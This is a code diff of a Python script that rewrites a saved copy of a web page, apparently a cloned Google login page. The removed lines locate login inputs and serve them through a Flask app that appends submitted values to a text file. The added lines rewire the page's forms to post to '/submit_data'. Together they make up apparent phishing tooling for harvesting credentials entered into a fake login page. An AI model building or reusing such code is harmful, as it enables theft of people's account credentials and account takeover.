@@ -1,78 +1,42 @@
 from calendar import c
 from bs4 import BeautifulSoup
 import os
-import itertools
-
-# Define the directory path where the HTML file is stored
-base_dir = os.path.dirname(os.path.abspath(__file__))
-#path = os.path.join(base_dir, 'accounts.google.com', 'index.html')
-link_var = []
-foundinputs = []
+import chardet
+import re
 
 
-# Read the keywords from the files
-with open('link_keywords', 'r', encoding='utf-8') as file:
-    for line in file:
-        link_var.append(line.strip())
-with open('mail_keywords', 'r', encoding='utf-8') as file:
-    for line in file:
-        link_var.append(line.strip())
-print(link_var)
 # Read the HTML file
-with open('index.html', encoding="utf-8") as f:
-    html = f.read()
+with open('index.html', 'rb') as f:
+    data = f.read()
+    encoding = chardet.detect(data)['encoding']
+    html = data.decode(encoding)
 
-soup = BeautifulSoup(html, "html.parser")
+# Remove all the form tags from the HTML
+html = re.sub(r"<form.*?>", "", html)
+html = re.sub(r"</form>", "", html)
 
-inputs = soup.find_all("input")
-#print(inputs)
+# Insert the form tag before the body tag
+soup = BeautifulSoup(html, 'html.parser')
+body = soup.body
+form = soup.new_tag('form', attrs={'method': 'post'})
+#form.attrs = {'method': form.attrs['method'], 'action': form.attrs['action']}
+body.insert_before(form)
+form.append(body)
 
-# for input_tag in inputs:
-#     if "login" in input_tag.attrs.get("value", "") or "login" in input_tag.attrs.get("name", ""):
-#         print("Found 'login' in input tag:", input_tag)
-# Define the function to check for keywords in the input fields
-def check_form(word_list, input_fields):
-    for word in word_list:
-        for input_tag in input_fields:
-            if word in input_tag.attrs.get("value", "") or word in input_tag.attrs.get("name", ""):
-                print(word+":")
-                print("")
-                foundinputs.append(input_tag)
-                
-check_form(link_var, inputs)
-print(foundinputs)
 
-from flask import Flask, request
 
-app = Flask(__name__)
+# Write the modified HTML back to the index.html file
+with open("index.html", "w") as f:
+    f.write(str(soup))
 
-@app.route('/', methods=['GET', 'POST'])
-def index():
-    if request.method == 'POST':
-        # read user input from the POST request and save it to a file
-        with open('user_input.txt', 'a') as f:
-            f.write(request.form['input_name'] + '\n')
-        return 'Success!'
-    
-    # Find the input fields that match your criteria
-    inputs = soup.find_all("input")
-    foundinputs = []
-    for input_tag in inputs:
-        if "login" in input_tag.attrs.get("value", "") or "login" in input_tag.attrs.get("name", ""):
-            foundinputs.append(input_tag)
-    
-    # Replace the input fields with a new form that submits to your app.py script
-    for input_tag in foundinputs:
-        new_element = soup.new_tag('form', action='http://localhost:5000/', method='POST')
-        input_name = input_tag.attrs.get("name", "")
-        input_type = input_tag.attrs.get("type", "text")
-        new_input = soup.new_tag('input', type=input_type, name=input_name)
-        new_submit = soup.new_tag('input', type='submit', value='Submit')
-        new_element.append(new_input)
-        new_element.append(new_submit)
-        input_tag.replace_with(new_element)
-    
-    return str(soup)
+# Read the contents of the file
+with open('index.html', 'r') as f:
+    file_contents = f.read()
 
-if __name__ == '__main__':
-    app.run()
+# Use regex to find the form element and modify its attributes
+new_contents = re.sub(r'<form method="post">', '<form method="post" action="/submit_data">', file_contents)
+
+# Write the modified contents back to the file
+with open('index.html', 'w') as f:
+    f.write(new_contents)
+
